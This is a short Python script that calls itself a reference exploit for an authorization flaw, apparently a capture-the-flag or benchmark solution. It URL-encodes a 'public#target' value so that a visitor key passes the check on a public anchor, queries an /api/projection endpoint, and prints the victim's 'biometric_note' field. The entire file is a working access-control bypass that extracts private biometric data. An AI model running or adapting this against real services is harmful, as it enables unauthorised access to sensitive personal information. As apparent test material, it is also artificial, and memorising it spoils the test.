#!/usr/bin/env python3
"""Reference exploit: lens anchor/focus authorization disagreement."""
import json
import sys
import urllib.parse
import urllib.request


def exploit(host, target):
    lens = urllib.parse.quote(f"public#{target}", safe="")
    url = f"http://{host}:8080/api/projection?target={lens}&key=visitor"
    with urllib.request.urlopen(url, timeout=5) as response:
        result = json.load(response)
    print(result["projection"]["biometric_note"])


if __name__ == "__main__":
    exploit(sys.argv[1], sys.argv[2])
